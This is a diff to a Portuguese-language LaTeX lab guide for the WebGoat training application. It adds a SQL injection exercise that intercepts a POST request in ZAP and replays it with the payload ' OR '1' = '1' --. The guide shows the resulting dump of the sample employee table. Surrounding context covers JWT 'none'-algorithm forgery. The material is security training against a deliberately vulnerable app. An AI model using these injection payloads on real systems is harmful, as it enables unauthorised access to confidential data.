@@ -125,6 +125,9 @@ http://webgoat:9090/WebWolf
 \end{lstlisting}
 \end{enumerate}
 
+% -----------------------JWT--------------------------%
+
+
 \section{Vulnerabilidades em JSON Web Tokens (JWT)}
 
 JWT é um padrão usado para autenticação em aplicações web. Estrutura: header.payload.signature, onde cada parte é codificada em base64.
@@ -163,9 +166,13 @@ Se a aplicação aceita tokens com algoritmo "none" (sem assinatura), é possív
     \item No ZAP Requester, substitua o token no header e envie
 \end{enumerate}
 
-\section{Injeção SQL}
+% -----------------------SQL--------------------------%
 
+
+\section{Injeção SQL}
 Injeção SQL é um ataque que explora vulnerabilidades em aplicações que interagem com bancos de dados, permitindo que um atacante execute comandos SQL não autorizados.
+\subsection{Exercício 3: Personificação com ZAP para Extração de Dados}
+O objetivo deste ataque é personificar o sistema para conseguir informações confidenciais de um banco de dados.
 
 \begin{enumerate}
     \item Dentro do WebGoat, vamos acessar \texttt{(A3) Injection > SQL Injection (intro) > Página 2}.
@@ -192,7 +199,48 @@ SELECT department FROM employees WHERE userid=96134;
 \end{lstlisting}
 \end{enumerate}
 
-O objetivo deste ataque foi personificar o sistema para conseguir informações confidenciais de um banco de dados.
+\subsection{Exercício 4: Comprometer Confidencialidade com Injeção String SQL}
+Neste exercício iremos burlar a validação de busca do sistema para termos acesso a informação de todos os usuários.
+\begin{enumerate}
+    \item Dentro do WebGoat, vamos acessar \texttt{(A3) Injection > SQL Injection (intro) > Página 11}.
+    \item Em \texttt{"SQL Query"}, vamos colocar o dados abaixo:
+\begin{lstlisting}[style=json]
+Employee Name: Travers
+Authentication TAN: P45JSI
+\end{lstlisting}
+    \item Clicar em \texttt{"Submit"}.
+    \item Acessar o ZAP e procurar por uma requisição de método POST com Tags JSON e verificar se contém a nossa Query SQL. Devemos encontrar um requisição com este texto:
+\begin{lstlisting}[style=sql]
+name=Travers&auth_tan=P45JSI
+\end{lstlisting}
+    \item Após identificarmos, podemos clicar em \texttt{"Requester"} na parte superior direita do ZAP e selecionar o Method POST.
+    \item Vamos colocar os mesmos dados do cabeçalho que o pacote que enviamos anteriormente pelo WebGoat.
+    \item No campo de texto inferior do ZAP devemos colocar o comando SQL abaixo:
+    \begin{lstlisting}[style=sql]
+name=' OR '1' = '1' --&auth_tan=
+\end{lstlisting}
+    \item Podemos clicar em \texttt{"Send"} e ver a resposta que o sistema nos fornece.
+    \item Se estiver correto, podemos esperar uma resposta assim:
+\begin{lstlisting}[style=json]
+{
+  "lessonCompleted" : true,
+  "feedback" : "You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!",
+  "feedbackArgs" : null,
+  "output" : "<table><tr><th>USERID<\\/th><th>FIRST_NAME<\\/th><th>LAST_NAME<\\/th><th>DEPARTMENT<\\/th><th>SALARY<\\/th><th>AUTH_TAN<\\/th><\\/tr><tr><td>32147<\\/td><td>Paulina<\\/td><td>Travers<\\/td><td>Accounting<\\/td><td>46000<\\/td><td>P45JSI<\\/td><\\/tr><tr><td>34477<\\/td><td>Abraham <\\/td><td>Holman<\\/td><td>Development<\\/td><td>50000<\\/td><td>UU2ALK<\\/td><\\/tr><tr><td>37648<\\/td><td>John<\\/td><td>Smith<\\/td><td>Marketing<\\/td><td>64350<\\/td><td>3SL99A<\\/td><\\/tr><tr><td>89762<\\/td><td>Tobi<\\/td><td>Barnett<\\/td><td>Development<\\/td><td>77000<\\/td><td>TA9LL1<\\/td><\\/tr><tr><td>96134<\\/td><td>Bob<\\/td><td>Franco<\\/td><td>Marketing<\\/td><td>83700<\\/td><td>LO9S2V<\\/td><\\/tr><\\/table>",
+  "outputArgs" : null,
+  "assignment" : "SqlInjectionLesson8",
+  "attemptWasMade" : true
+}
+\end{lstlisting}
+    \item Podemos também colocar o comando abaixo no formulário Employee Name do WebGoat:
+    \begin{lstlisting}[style=sql]
+    ' OR '1' = '1' --
+    \end{lstlisting}
+    
+\end{enumerate}
+
+% -----------------------Spoofing--------------------------%
+
 
 \section{Falsificação de Cookie de Autenticação (Spoofing)}
 
